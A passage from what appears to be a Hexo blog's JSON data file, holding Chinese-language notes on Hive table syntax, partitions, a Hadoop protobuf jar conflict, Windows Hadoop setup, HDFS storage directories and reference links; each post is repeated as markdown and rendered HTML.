OLAP：Kylin一个cube分析工具，底层的数据就是存储在HBase之中，不少客户自己基于离线计算构建cube存储在hbase之中，满足在线报表查询的需求</p>\n<p>消息/订单：在电信领域、银行领域，不少的订单查询底层的存储，另外不少通信、消息同步的应用构建在HBase之上</p>\n<p>Feeds流：典型的应用就是xx朋友圈类似的应用</p>\n<p>NewSQL：之上有Phoenix的插件，可以满足二级索引、SQL的需求，对接传统数据需要SQL非事务的需求</p>\n"},{"title":"Hive","date":"2018-07-10T13:09:19.000Z","_content":"- #### Hive默认的分隔符\r\n\r\nHive的表数据，不管导出到HDFS还是本地文件系统，如果用户在导出时没有指定分割符，那么Hive表的数据在写入文件时，会使用默认的分隔符作为列分隔符，该默认的分割是“CTR+A”，ASCII码排第二位的字符，是不可见字符，二进制表示：'\\u0001'。\r\n\r\n手动设置分隔符\r\n```\r\ndrop table if exists hs_ods.tmp_acpt_busin_type ;\r\nCREATE EXTERNAL TABLE hs_ods.tmp_acpt_busin_type(\r\nacpt_busin_type string,\r\np45 string,\r\np46 string,\r\np47 string,\r\np50 String\r\n)\r\nLOCATION  '/user/hive/sourcetab/hs_ods/ods_tmp_acpt_busin_type';\r\nROW FORMAT DELIMITED FIELDS TERMINATED BY '~';\r\n```\r\n- #### 删除数去库语法\r\n```\r\nDROP DATABASE StatementDROP (DATABASE|SCHEMA) [IF EXISTS] database_name \r\n[RESTRICT|CASCADE];\r\n```\r\n- #### 修改表结构\r\n```\r\nCREATE TABLE test_change (a int, b int, c int);\r\n \r\n// First change column a's name to a1.\r\nALTER TABLE test_change CHANGE a a1 INT;\r\n \r\n// Next change column a1's name to a2, its data type to string, and put it after column b.\r\nALTER TABLE test_change CHANGE a1 a2 STRING AFTER b;\r\n// The new table's structure is:  b int, a2 string, c int.\r\n \r\n// Then change column c's name to c1, and put it as the first column.\r\nALTER TABLE test_change CHANGE c c1 INT FIRST;\r\n// The new table's structure is:  c1 int, b int, a2 string.\r\n \r\n// Add a comment to column a1\r\nALTER TABLE test_change CHANGE a1 a1 INT COMMENT 'this is column a1';\r\n```\r\n\r\n- #### 带参数的hivesql\r\n\r\nsql脚本\r\n```\r\nvim hivesql_with_param.sql\r\nuse database;\r\nselect \r\n'${hiveconf:begin_date}'，'${hiveconf:end_date}'\r\nfrom table;\r\n```\r\n运行命令\r\n\r\n    hive -hiveconf begin_date=1 -hiveconf end_date=2 -f hivesql_with_param.sql\r\n\r\nhive表增加分区\r\n\r\n    alter table ods_hs_his_his_asset add partition (part_date='20170130') location '/user/hive/sourcetab/hs_ods/ods_hs_his_his_asset/20170130'; \r\n\r\n删除分区\r\n\r\n    alter table ods_hs_data_assetdebit drop partition (part_date='20170103');\r\n\r\n- #### 计算引擎 \r\nhive.execution.engine","source":"_posts/Hadoop/Hive.md","raw":"---\ntitle: Hive\ndate: 2018-07-10 21:09:19\ntags: Hadoop\n---\n- #### Hive默认的分隔符\r\n\r\nHive的表数据，不管导出到HDFS还是本地文件系统，如果用户在导出时没有指定分割符，那么Hive表的数据在写入文件时，会使用默认的分隔符作为列分隔符，该默认的分割是“CTR+A”，ASCII码排第二位的字符，是不可见字符，二进制表示：'\\u0001'。\r\n\r\n手动设置分隔符\r\n```\r\ndrop table if exists hs_ods.tmp_acpt_busin_type ;\r\nCREATE EXTERNAL TABLE hs_ods.tmp_acpt_busin_type(\r\nacpt_busin_type string,\r\np45 string,\r\np46 string,\r\np47 string,\r\np50 String\r\n)\r\nLOCATION  '/user/hive/sourcetab/hs_ods/ods_tmp_acpt_busin_type';\r\nROW FORMAT DELIMITED FIELDS TERMINATED BY '~';\r\n```\r\n- #### 删除数去库语法\r\n```\r\nDROP DATABASE StatementDROP (DATABASE|SCHEMA) [IF EXISTS] database_name \r\n[RESTRICT|CASCADE];\r\n```\r\n- #### 修改表结构\r\n```\r\nCREATE TABLE test_change (a int, b int, c int);\r\n \r\n// First change column a's name to a1.\r\nALTER TABLE test_change CHANGE a a1 INT;\r\n \r\n// Next change column a1's name to a2, its data type to string, and put it after column b.\r\nALTER TABLE test_change CHANGE a1 a2 STRING AFTER b;\r\n// The new table's structure is:  b int, a2 string, c int.\r\n \r\n// Then change column c's name to c1, and put it as the first column.\r\nALTER TABLE test_change CHANGE c c1 INT FIRST;\r\n// The new table's structure is:  c1 int, b int, a2 string.\r\n \r\n// Add a comment to column a1\r\nALTER TABLE test_change CHANGE a1 a1 INT COMMENT 'this is column a1';\r\n```\r\n\r\n- #### 带参数的hivesql\r\n\r\nsql脚本\r\n```\r\nvim hivesql_with_param.sql\r\nuse database;\r\nselect \r\n'${hiveconf:begin_date}'，'${hiveconf:end_date}'\r\nfrom table;\r\n```\r\n运行命令\r\n\r\n    hive -hiveconf begin_date=1 -hiveconf end_date=2 -f hivesql_with_param.sql\r\n\r\nhive表增加分区\r\n\r\n    alter table ods_hs_his_his_asset add partition (part_date='20170130') location '/user/hive/sourcetab/hs_ods/ods_hs_his_his_asset/20170130'; \r\n\r\n删除分区\r\n\r\n    alter table ods_hs_data_assetdebit drop partition (part_date='20170103');\r\n\r\n- #### 计算引擎 \r\nhive.execution.engine","slug":"Hadoop/Hive","published":1,"updated":"2018-07-10T13:10:09.878Z","_id":"cjjedmh90001p0gtjpe47elb9","comments":1,"layout":"post","photos":[],"link":"","content":"<ul>\n<li><h4 id=\"Hive默认的分隔符\"><a href=\"#Hive默认的分隔符\" class=\"headerlink\" title=\"Hive默认的分隔符\"></a>Hive默认的分隔符</h4></li>\n</ul>\n<p>Hive的表数据，不管导出到HDFS还是本地文件系统，如果用户在导出时没有指定分割符，那么Hive表的数据在写入文件时，会使用默认的分隔符作为列分隔符，该默认的分割是“CTR+A”，ASCII码排第二位的字符，是不可见字符，二进制表示：’\\u0001’。</p>\n<p>手动设置分隔符</p>\n<pre><code>drop table if exists hs_ods.tmp_acpt_busin_type ;\nCREATE EXTERNAL TABLE hs_ods.tmp_acpt_busin_type(\nacpt_busin_type string,\np45 string,\np46 string,\np47 string,\np50 String\n)\nLOCATION  &apos;/user/hive/sourcetab/hs_ods/ods_tmp_acpt_busin_type&apos;;\nROW FORMAT DELIMITED FIELDS TERMINATED BY &apos;~&apos;;\n</code></pre><ul>\n<li><h4 id=\"删除数去库语法\"><a href=\"#删除数去库语法\" class=\"headerlink\" title=\"删除数去库语法\"></a>删除数去库语法</h4><pre><code>DROP DATABASE StatementDROP (DATABASE|SCHEMA) [IF EXISTS] database_name \n[RESTRICT|CASCADE];\n</code></pre></li>\n<li><h4 id=\"修改表结构\"><a href=\"#修改表结构\" class=\"headerlink\" title=\"修改表结构\"></a>修改表结构</h4><code>`</code><br>CREATE TABLE test_change (a int, b int, c int);</li>\n</ul>\n<p>// First change column a’s name to a1.<br>ALTER TABLE test_change CHANGE a a1 INT;</p>\n<p>// Next change column a1’s name to a2, its data type to string, and put it after column b.<br>ALTER TABLE test_change CHANGE a1 a2 STRING AFTER b;<br>// The new table’s structure is:  b int, a2 string, c int.</p>\n<p>// Then change column c’s name to c1, and put it as the first column.<br>ALTER TABLE test_change CHANGE c c1 INT FIRST;<br>// The new table’s structure is:  c1 int, b int, a2 string.</p>\n<p>// Add a comment to column a1<br>ALTER TABLE test_change CHANGE a1 a1 INT COMMENT ‘this is column a1’;</p>\n<pre><code>\n- #### 带参数的hivesql\n\nsql脚本\n</code></pre><p>vim hivesql_with_param.sql<br>use database;<br>select<br>‘${hiveconf:begin_date}’，’${hiveconf:end_date}’<br>from table;<br><code>`</code><br>运行命令</p>\n<pre><code>hive -hiveconf begin_date=1 -hiveconf end_date=2 -f hivesql_with_param.sql\n</code></pre><p>hive表增加分区</p>\n<pre><code>alter table ods_hs_his_his_asset add partition (part_date=&apos;20170130&apos;) location &apos;/user/hive/sourcetab/hs_ods/ods_hs_his_his_asset/20170130&apos;; \n</code></pre><p>删除分区</p>\n<pre><code>alter table ods_hs_data_assetdebit drop partition (part_date=&apos;20170103&apos;);\n</code></pre><ul>\n<li><h4 id=\"计算引擎\"><a href=\"#计算引擎\" class=\"headerlink\" title=\"计算引擎\"></a>计算引擎</h4>hive.execution.engine</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li><h4 id=\"Hive默认的分隔符\"><a href=\"#Hive默认的分隔符\" class=\"headerlink\" title=\"Hive默认的分隔符\"></a>Hive默认的分隔符</h4></li>\n</ul>\n<p>Hive的表数据，不管导出到HDFS还是本地文件系统，如果用户在导出时没有指定分割符，那么Hive表的数据在写入文件时，会使用默认的分隔符作为列分隔符，该默认的分割是“CTR+A”，ASCII码排第二位的字符，是不可见字符，二进制表示：’\\u0001’。</p>\n<p>手动设置分隔符</p>\n<pre><code>drop table if exists hs_ods.tmp_acpt_busin_type ;\nCREATE EXTERNAL TABLE hs_ods.tmp_acpt_busin_type(\nacpt_busin_type string,\np45 string,\np46 string,\np47 string,\np50 String\n)\nLOCATION  &apos;/user/hive/sourcetab/hs_ods/ods_tmp_acpt_busin_type&apos;;\nROW FORMAT DELIMITED FIELDS TERMINATED BY &apos;~&apos;;\n</code></pre><ul>\n<li><h4 id=\"删除数去库语法\"><a href=\"#删除数去库语法\" class=\"headerlink\" title=\"删除数去库语法\"></a>删除数去库语法</h4><pre><code>DROP DATABASE StatementDROP (DATABASE|SCHEMA) [IF EXISTS] database_name \n[RESTRICT|CASCADE];\n</code></pre></li>\n<li><h4 id=\"修改表结构\"><a href=\"#修改表结构\" class=\"headerlink\" title=\"修改表结构\"></a>修改表结构</h4><code>`</code><br>CREATE TABLE test_change (a int, b int, c int);</li>\n</ul>\n<p>// First change column a’s name to a1.<br>ALTER TABLE test_change CHANGE a a1 INT;</p>\n<p>// Next change column a1’s name to a2, its data type to string, and put it after column b.<br>ALTER TABLE test_change CHANGE a1 a2 STRING AFTER b;<br>// The new table’s structure is:  b int, a2 string, c int.</p>\n<p>// Then change column c’s name to c1, and put it as the first column.<br>ALTER TABLE test_change CHANGE c c1 INT FIRST;<br>// The new table’s structure is:  c1 int, b int, a2 string.</p>\n<p>// Add a comment to column a1<br>ALTER TABLE test_change CHANGE a1 a1 INT COMMENT ‘this is column a1’;</p>\n<pre><code>\n- #### 带参数的hivesql\n\nsql脚本\n</code></pre><p>vim hivesql_with_param.sql<br>use database;<br>select<br>‘${hiveconf:begin_date}’，’${hiveconf:end_date}’<br>from table;<br><code>`</code><br>运行命令</p>\n<pre><code>hive -hiveconf begin_date=1 -hiveconf end_date=2 -f hivesql_with_param.sql\n</code></pre><p>hive表增加分区</p>\n<pre><code>alter table ods_hs_his_his_asset add partition (part_date=&apos;20170130&apos;) location &apos;/user/hive/sourcetab/hs_ods/ods_hs_his_his_asset/20170130&apos;; \n</code></pre><p>删除分区</p>\n<pre><code>alter table ods_hs_data_assetdebit drop partition (part_date=&apos;20170103&apos;);\n</code></pre><ul>\n<li><h4 id=\"计算引擎\"><a href=\"#计算引擎\" class=\"headerlink\" title=\"计算引擎\"></a>计算引擎</h4>hive.execution.engine</li>\n</ul>\n"},{"title":"class org.apache.hadoop.security.proto.SecurityProtos$GetDelegationTokenRequestP","date":"2018-07-10T13:09:19.000Z","_content":"```\n Java.lang.VerifyError: class\n \n org.apache.hadoop.hdfs.protocol.proto.ClientNamenodeProtocolProtos$AppendRequestProto \n overrides final method getUnknownFields.()Lcom/google/protobuf/UnknownFieldSet\n```\njar包冲突\n替换protobuf包","source":"_posts/Hadoop/class org.apache.hadoop.security.proto.SecurityProtos$GetDelegationTokenRequestP.md","raw":"---\ntitle: class org.apache.hadoop.security.proto.SecurityProtos$GetDelegationTokenRequestP\ndate: 2018-07-10 21:09:19\ntags: Hadoop\n---\n```\n Java.lang.VerifyError: class\n \n org.apache.hadoop.hdfs.protocol.proto.ClientNamenodeProtocolProtos$AppendRequestProto \n overrides final method getUnknownFields.()Lcom/google/protobuf/UnknownFieldSet\n```\njar包冲突\n替换protobuf包","slug":"Hadoop/class org.apache.hadoop.security.proto.SecurityProtos$GetDelegationTokenRequestP","published":1,"updated":"2018-07-10T13:10:09.869Z","_id":"cjjedmh92001r0gtjk8wgm1gf","comments":1,"layout":"post","photos":[],"link":"","content":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Java.lang.VerifyError: class</span><br><span class=\"line\"></span><br><span class=\"line\">org.apache.hadoop.hdfs.protocol.proto.ClientNamenodeProtocolProtos$AppendRequestProto </span><br><span class=\"line\">overrides final method getUnknownFields.()Lcom/google/protobuf/UnknownFieldSet</span><br></pre></td></tr></table></figure>\n<p>jar包冲突<br>替换protobuf包</p>\n","site":{"data":{}},"excerpt":"","more":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Java.lang.VerifyError: class</span><br><span class=\"line\"></span><br><span class=\"line\">org.apache.hadoop.hdfs.protocol.proto.ClientNamenodeProtocolProtos$AppendRequestProto </span><br><span class=\"line\">overrides final method getUnknownFields.()Lcom/google/protobuf/UnknownFieldSet</span><br></pre></td></tr></table></figure>\n<p>jar包冲突<br>替换protobuf包</p>\n"},{"title":"hadoop-运行Hadoop","date":"2018-07-10T13:09:19.000Z","_content":"- ### [命令]-[包的路径]-[类名]\r\n- ### [hadoop jar]-[target/tag-0.0.1.jar com.hs.tag.tag.pretreatment.asset]-[Asset]\r\n- ### hadoop jar target/tag-0.0.1.jar com.hs.tag.tag.pretreatment.asset.Asset   ","source":"_posts/Hadoop/hadoop-运行Hadoop.md","raw":"---\ntitle: hadoop-运行Hadoop\ndate: 2018-07-10 21:09:19\ntags: Hadoop\n---\n- ### [命令]-[包的路径]-[类名]\r\n- ### [hadoop jar]-[target/tag-0.0.1.jar com.hs.tag.tag.pretreatment.asset]-[Asset]\r\n- ### hadoop jar target/tag-0.0.1.jar com.hs.tag.tag.pretreatment.asset.Asset   ","slug":"Hadoop/hadoop-运行Hadoop","published":1,"updated":"2018-07-10T13:10:09.875Z","_id":"cjjedmh93001u0gtjbljgbb21","comments":1,"layout":"post","photos":[],"link":"","content":"<ul>\n<li><h3 id=\"命令-包的路径-类名\"><a href=\"#命令-包的路径-类名\" class=\"headerlink\" title=\"[命令]-[包的路径]-[类名]\"></a>[命令]-[包的路径]-[类名]</h3></li>\n<li><h3 id=\"hadoop-jar-target-tag-0-0-1-jar-com-hs-tag-tag-pretreatment-asset-Asset\"><a href=\"#hadoop-jar-target-tag-0-0-1-jar-com-hs-tag-tag-pretreatment-asset-Asset\" class=\"headerlink\" title=\"[hadoop jar]-[target/tag-0.0.1.jar com.hs.tag.tag.pretreatment.asset]-[Asset]\"></a>[hadoop jar]-[target/tag-0.0.1.jar com.hs.tag.tag.pretreatment.asset]-[Asset]</h3></li>\n<li><h3 id=\"hadoop-jar-target-tag-0-0-1-jar-com-hs-tag-tag-pretreatment-asset-Asset-1\"><a href=\"#hadoop-jar-target-tag-0-0-1-jar-com-hs-tag-tag-pretreatment-asset-Asset-1\" class=\"headerlink\" title=\"hadoop jar target/tag-0.0.1.jar com.hs.tag.tag.pretreatment.asset.Asset\"></a>hadoop jar target/tag-0.0.1.jar com.hs.tag.tag.pretreatment.asset.Asset</h3></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li><h3 id=\"命令-包的路径-类名\"><a href=\"#命令-包的路径-类名\" class=\"headerlink\" title=\"[命令]-[包的路径]-[类名]\"></a>[命令]-[包的路径]-[类名]</h3></li>\n<li><h3 id=\"hadoop-jar-target-tag-0-0-1-jar-com-hs-tag-tag-pretreatment-asset-Asset\"><a href=\"#hadoop-jar-target-tag-0-0-1-jar-com-hs-tag-tag-pretreatment-asset-Asset\" class=\"headerlink\" title=\"[hadoop jar]-[target/tag-0.0.1.jar com.hs.tag.tag.pretreatment.asset]-[Asset]\"></a>[hadoop jar]-[target/tag-0.0.1.jar com.hs.tag.tag.pretreatment.asset]-[Asset]</h3></li>\n<li><h3 id=\"hadoop-jar-target-tag-0-0-1-jar-com-hs-tag-tag-pretreatment-asset-Asset-1\"><a href=\"#hadoop-jar-target-tag-0-0-1-jar-com-hs-tag-tag-pretreatment-asset-Asset-1\" class=\"headerlink\" title=\"hadoop jar target/tag-0.0.1.jar com.hs.tag.tag.pretreatment.asset.Asset\"></a>hadoop jar target/tag-0.0.1.jar com.hs.tag.tag.pretreatment.asset.Asset</h3></li>\n</ul>\n"},{"title":"hadoop-windows安装Hadoop问题","date":"2018-07-10T13:09:19.000Z","_content":" System.setProperty(\"hadoop.home.dir\", \"D:/hadoop-2.6.0\");\n \n 配置环境变量 HadoopHome\n \n hadoop-common-2.2.0-bin-master下的bin的hadoop.dll放到C:\\Windows\\System32下，然后重启电脑，","source":"_posts/Hadoop/hadoop-windows安装Hadoop问题.md","raw":"---\ntitle: hadoop-windows安装Hadoop问题\ndate: 2018-07-10 21:09:19\ntags: Hadoop\n---\n System.setProperty(\"hadoop.home.dir\", \"D:/hadoop-2.6.0\");\n \n 配置环境变量 HadoopHome\n \n hadoop-common-2.2.0-bin-master下的bin的hadoop.dll放到C:\\Windows\\System32下，然后重启电脑，","slug":"Hadoop/hadoop-windows安装Hadoop问题","published":1,"updated":"2018-07-10T13:10:09.874Z","_id":"cjjedmh94001w0gtj8qt73ee1","comments":1,"layout":"post","photos":[],"link":"","content":"<p> System.setProperty(“hadoop.home.dir”, “D:/hadoop-2.6.0”);</p>\n<p> 配置环境变量 HadoopHome</p>\n<p> hadoop-common-2.2.0-bin-master下的bin的hadoop.dll放到C:\\Windows\\System32下，然后重启电脑，</p>\n","site":{"data":{}},"excerpt":"","more":"<p> System.setProperty(“hadoop.home.dir”, “D:/hadoop-2.6.0”);</p>\n<p> 配置环境变量 HadoopHome</p>\n<p> hadoop-common-2.2.0-bin-master下的bin的hadoop.dll放到C:\\Windows\\System32下，然后重启电脑，</p>\n"},{"title":"hadoop 增加存储目录","date":"2018-07-10T13:09:19.000Z","_content":"直接在cdh上配置\n\nHDFS -> 配置 -> datanode ->DataNode 数据目录dfs.data.dir,dfs.datanode.data.dir\n\n增加一个目录，不用提前创建\n\n\n```\n[root@hs03 dn]# hadoop fs -df -h\nFilesystem           Size     Used  Available  Use%\nhdfs://hs03:8020  854.0 G  291.8 G    337.7 G   34%\n\n[root@hs03 dn]# df -h\nFilesystem            Size  Used Avail Use% Mounted on\n/dev/mapper/vg_dev023053-lv_root    295G  229G   52G  82% /\ntmpfs                               16G     0   16G   0% /dev/shm\n/dev/sda1                           477M   33M  419M   8% /boot\ncm_processes                        16G   89M   16G   1% /opt/cm-5.7.1/run/cloudera-scm-agent/process\n\n[root@hs03 dn]# hadoop fs -df -h\nFilesystem           Size     Used  Available  Use%\nhdfs://hs03:8020  859.7 G  291.8 G    343.5 G   34%\n[root@hs03 dn]# \n```","source":"_posts/Hadoop/hadoop 增加存储目录.md","raw":"---\ntitle: hadoop 增加存储目录\ndate: 2018-07-10 21:09:19\ntags: Hadoop\n---\n直接在cdh上配置\n\nHDFS -> 配置 -> datanode ->DataNode 数据目录dfs.data.dir,dfs.datanode.data.dir\n\n增加一个目录，不用提前创建\n\n\n```\n[root@hs03 dn]# hadoop fs -df -h\nFilesystem           Size     Used  Available  Use%\nhdfs://hs03:8020  854.0 G  291.8 G    337.7 G   34%\n\n[root@hs03 dn]# df -h\nFilesystem            Size  Used Avail Use% Mounted on\n/dev/mapper/vg_dev023053-lv_root    295G  229G   52G  82% /\ntmpfs                               16G     0   16G   0% /dev/shm\n/dev/sda1                           477M   33M  419M   8% /boot\ncm_processes                        16G   89M   16G   1% /opt/cm-5.7.1/run/cloudera-scm-agent/process\n\n[root@hs03 dn]# hadoop fs -df -h\nFilesystem           Size     Used  Available  Use%\nhdfs://hs03:8020  859.7 G  291.8 G    343.5 G   34%\n[root@hs03 dn]# \n```","slug":"Hadoop/hadoop 增加存储目录","published":1,"updated":"2018-07-10T13:10:09.872Z","_id":"cjjedmh95001y0gtjz2ty71uo","comments":1,"layout":"post","photos":[],"link":"","content":"<p>直接在cdh上配置</p>\n<p>HDFS -&gt; 配置 -&gt; datanode -&gt;DataNode 数据目录dfs.data.dir,dfs.datanode.data.dir</p>\n<p>增加一个目录，不用提前创建</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@hs03 dn]# hadoop fs -df -h</span><br><span class=\"line\">Filesystem           Size     Used  Available  Use%</span><br><span class=\"line\">hdfs://hs03:8020  854.0 G  291.8 G    337.7 G   34%</span><br><span class=\"line\"></span><br><span class=\"line\">[root@hs03 dn]# df -h</span><br><span class=\"line\">Filesystem            Size  Used Avail Use% Mounted on</span><br><span class=\"line\">/dev/mapper/vg_dev023053-lv_root    295G  229G   52G  82% /</span><br><span class=\"line\">tmpfs                               16G     0   16G   0% /dev/shm</span><br><span class=\"line\">/dev/sda1                           477M   33M  419M   8% /boot</span><br><span class=\"line\">cm_processes                        16G   89M   16G   1% /opt/cm-5.7.1/run/cloudera-scm-agent/process</span><br><span class=\"line\"></span><br><span class=\"line\">[root@hs03 dn]# hadoop fs -df -h</span><br><span class=\"line\">Filesystem           Size     Used  Available  Use%</span><br><span class=\"line\">hdfs://hs03:8020  859.7 G  291.8 G    343.5 G   34%</span><br><span class=\"line\">[root@hs03 dn]#</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<p>直接在cdh上配置</p>\n<p>HDFS -&gt; 配置 -&gt; datanode -&gt;DataNode 数据目录dfs.data.dir,dfs.datanode.data.dir</p>\n<p>增加一个目录，不用提前创建</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@hs03 dn]# hadoop fs -df -h</span><br><span class=\"line\">Filesystem           Size     Used  Available  Use%</span><br><span class=\"line\">hdfs://hs03:8020  854.0 G  291.8 G    337.7 G   34%</span><br><span class=\"line\"></span><br><span class=\"line\">[root@hs03 dn]# df -h</span><br><span class=\"line\">Filesystem            Size  Used Avail Use% Mounted on</span><br><span class=\"line\">/dev/mapper/vg_dev023053-lv_root    295G  229G   52G  82% /</span><br><span class=\"line\">tmpfs                               16G     0   16G   0% /dev/shm</span><br><span class=\"line\">/dev/sda1                           477M   33M  419M   8% /boot</span><br><span class=\"line\">cm_processes                        16G   89M   16G   1% /opt/cm-5.7.1/run/cloudera-scm-agent/process</span><br><span class=\"line\"></span><br><span class=\"line\">[root@hs03 dn]# hadoop fs -df -h</span><br><span class=\"line\">Filesystem           Size     Used  Available  Use%</span><br><span class=\"line\">hdfs://hs03:8020  859.7 G  291.8 G    343.5 G   34%</span><br><span class=\"line\">[root@hs03 dn]#</span><br></pre></td></tr></table></figure>"},{"title":"hadoop-Hadoop高可用","date":"2018-07-10T13:09:19.000Z","_content":"http://blog.csdn.net/u011414200/article/details/50350154\n\n\nhttps://www.ibm.com/developerworks/cn/opensource/os-cn-hadoop-name-node/\n\n\n\nhttps://www.ibm.com/developerworks/cn/opensource/os-cn-hadoop-name-node/index.html","source":"_posts/Hadoop/hadoop-Hadoop高可用.md","raw":"---\ntitle: hadoop-Hadoop高可用\ndate: 2018-07-10 21:09:19\ntags: Hadoop\n---\nhttp://blog.csdn.net/u011414200/article/details/50350154\n\n\nhttps://www.ibm.com/developerworks/cn/opensource/os-cn-hadoop-name-node/\n\n\n\nhttps://www.ibm.com/developerworks/cn/opensource/os-cn-hadoop-name-node/index.html","slug":"Hadoop/hadoop-Hadoop高可用","published":1,"updated":"2018-07-10T13:10:09.873Z","_id":"cjjedmh9600200gtjlln4povs","comments":1,"layout":"post","photos":[],"link":"","content":"<p><a href=\"http://blog.csdn.net/u011414200/article/details/50350154\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/u011414200/article/details/50350154</a></p>\n<p><a href=\"https://www.ibm.com/developerworks/cn/opensource/os-cn-hadoop-name-node/\" target=\"_blank\" rel=\"noopener\">https://www.ibm.com/developerworks/cn/opensource/os-cn-hadoop-name-node/</a></p>\n<p><a href=\"https://www.ibm.com/developerworks/cn/opensource/os-cn-hadoop-name-node/index.html\" target=\"_blank\" rel=\"noopener\">https://www.ibm.com/developerworks/cn/opensource/os-cn-hadoop-name-node/index.html</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"http://blog.csdn.net/u011414200/article/details/50350154\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/u011414200/article/details/50350154</a></p>\n<p><a href=\"https://www.ibm.com/developerworks/cn/opensource/os-cn-hadoop-name-node/\" target=\"_blank\" rel=\"noopener\">https://www.ibm.com/developerworks/cn/opensource/os-cn-hadoop-name-node/</a></p>\n<p><a href=\"https://www.ibm.com/developerworks/cn/opensource/os-cn-hadoop-name-node/index.html\" target=\"_blank\" rel=\"noopener\">https://www.ibm.com/developerworks/cn/opensource/os-cn-hadoop-name-node/index.html</a></p>\n"},{"title":"mahot-Mahout","date":"2018-07-10T13:09:19.000Z","_content":"[介绍](http://blog.fens.me/hadoop-mahout-roadmap/)\n\n[安装和使用](http://blog.csdn.net/zdp072/article/details/42653373)\n\n[demo](http://blog.fens.me/hadoop-mahout-recommend-job/)","source":"_posts/Hadoop/mahot-Mahout.md","raw":"---\ntitle: mahot-Mahout\ndate: 2018-07-10 21:09:19\ntags: Hadoop\n---\n[介绍](http://blog.fens.me/hadoop-mahout-roadmap/)\n\n[安装和使用](http://blog.csdn.net/zdp072/article/details/42653373)\n\n[demo](http://blog.fens.me/hadoop-mahout-recommend-job/)","slug":"Hadoop/mahot-Mahout","published":1,"updated":"2018-07-10T13:10:09.879Z","_id":"cjjedmh9700220gtjns0rhth4","comments":1,"layout":"post","photos":[],"link":"","content":"<p><a href=\"http://blog.fens.me/hadoop-mahout-roadmap/\" target=\"_blank\" rel=\"noopener\">介绍</a></p>\n<p><a href=\"http://blog.csdn.net/zdp072/article/details/42653373\" target=\"_blank\" rel=\"noopener\">安装和使用</a></p>\n<p><a href=\"http://blog.fens.me/hadoop-mahout-recommend-job/\" target=\"_blank\" rel=\"noopener\">demo</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"http://blog.fens.me/hadoop-mahout-roadmap/\" target=\"_blank\" rel=\"noopener\">介绍</a></p>\n<p><a href=\"http://blog.csdn.net/zdp072/article/details/42653373\" target=\"_blank\" rel=\"noopener\">安装和使用</a></p>\n<p><a href=\"http://blog.fens.me/hadoop-mahout-recommend-job/\" target=\"_blank\" rel=\"noopener\">demo</a></p>\n"},{"title":"other-推荐系统","date":"2018-07-10T13:09:19.000Z","_content":"[亚马逊itemCF](http://geek.csdn.net/news/detail/208911)","source":"_posts/Hadoop/other-推荐系统.md","raw":"---\ntitle: other-推荐系统\ndate: 2018-07-10 21:09:19\ntags: Hadoop\n---\n[亚马逊itemCF](http://geek.csdn.net/news/detail/208911)","slug":"Hadoop/other-推荐系统","published":1,"updated":"2018-07-10T13:10:09.880Z","_id":"cjjedmh9800240gtjp204k3mt","comments":1,"layout":"post","photos":[],"link":"","content":"<p><a href=\"http://geek.csdn.net/news/detail/208911\" target=\"_blank\" rel=\"noopener\">亚马逊itemCF</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"http://geek.csdn.net/news/detail/208911\" target=\"_blank\" rel=\"noopener\">亚马逊itemCF</a></p>\n"},{"title":"shuffle erro","date":"2018-07-10T13:09:19.000Z","_content":"http://blog.csdn.net/dslztx/article/details/46445725\n\nhttps://issues.apache.org/jira/browse/MAPREDUCE-6447\n\nhttp://hs03:7180/cmf/services/13/config#filterfreeText=shuffle","source":"_posts/Hadoop/shuffle erro.md","raw":"---\ntitle: shuffle erro\ndate: 2018-07-10 21:09:19\ntags: Hadoop\n---\nhttp://blog.csdn.net/dslztx/article/details/46445725\n\nhttps://issues.apache.org/jira/browse/MAPREDUCE-6447\n\nhttp://hs03:7180/cmf/services/13/config#filterfreeText=shuffle","slug":"Hadoop/shuffle erro","published":1,"updated":"2018-07-10T13:10:09.881Z","_id":"cjjedmh9800260gtjw8n2x083","comments":1,"layout":"post","photos":[],"link":"","content":"<p><a href=\"http://blog.csdn.net/dslztx/article/details/46445725\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/dslztx/article/details/46445725</a></p>\n<p><a href=\"https://issues.apache.org/jira/browse/MAPREDUCE-6447\" target=\"_blank\" rel=\"noopener\">https://issues.apache.org/jira/browse/MAPREDUCE-6447</a></p>\n<p><a href=\"http://hs03:7180/cmf/services/13/config#filterfreeText=shuffle\" target=\"_blank\" rel=\"noopener\">http://hs03:7180/cmf/services/13/config#filterfreeText=shuffle</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p><a 